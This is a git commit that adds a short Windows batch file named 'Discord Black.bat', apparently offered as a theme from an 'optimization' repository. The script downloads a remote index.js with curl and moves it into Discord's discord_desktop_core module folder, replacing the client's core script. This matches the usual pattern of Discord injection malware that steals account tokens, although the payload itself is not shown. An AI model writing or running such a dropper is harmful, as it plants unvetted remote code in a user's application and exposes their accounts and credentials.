00f7ae3d37b1d881f100bb6d4a5e7f4b21071c98
Teddy Mazrin <79080359+Teddymazrin@users.noreply.github.com>
2025-01-04 23:10:11 -0600

    Add files via upload

---
+++ Discord Black.bat
@@ -0,0 +1,5 @@
+curl -o "%temp%\index.js" "https://raw.githubusercontent.com/Teddymazrin/Windows-Optimization/main/Scripts/index.js"
+
+move "%temp%\index.js" "%localappdata%\Discord\app-1.0.9175\modules\discord_desktop_core-1\discord_desktop_core\"
+
+
